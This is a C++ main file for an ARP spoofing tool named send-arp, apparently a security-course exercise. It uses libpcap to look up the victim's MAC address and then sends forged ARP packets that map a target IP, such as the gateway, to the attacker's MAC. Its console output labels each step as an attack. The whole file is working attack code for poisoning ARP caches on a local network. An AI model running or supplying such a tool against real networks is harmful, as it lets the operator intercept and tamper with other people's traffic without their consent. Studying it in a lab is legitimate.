#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "send-arp.h"

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc %2  != 0 ) {
		usage();
		return -1;
	}

	Mac attackerMac, senderMac;
	Ip attackerIp, senderIp, targetIp;

	string interface = argv[1];

	cout << "Getting Attacker Info...\n" ;
	getAttackerInfo(interface, attackerMac, attackerIp);
	cout << "Attacker MAC Address: " << string(attackerMac) << "\n";
	cout << "Attacker IP Address: " << string(attackerIp) << "\n";
	cout << "\n=============================================\n\n";
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=1; i< argc/2 ; i++) {
		senderIp = Ip(argv[i*2]);
		cout <<"Setting Sender IP to: " << argv[i*2] << "\n";
		targetIp = Ip(argv[i*2 +1]);
		cout << "Setting Target IP to: " << argv[i*2+1] << "\n";
		cout << "\nGetting Sender MAC Address...\n";
		getSenderMAC(handle, senderMac, senderIp, attackerMac, attackerIp);
		cout << "Sender MAC Address: " << string(senderMac) << "\n";
		cout << "\nPerforming Attack on Sender...\n";
		sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
		cout << "Attack Complete!\n";
		cout << "\n=============================================\n\n";

	}
	pcap_close(handle);
}
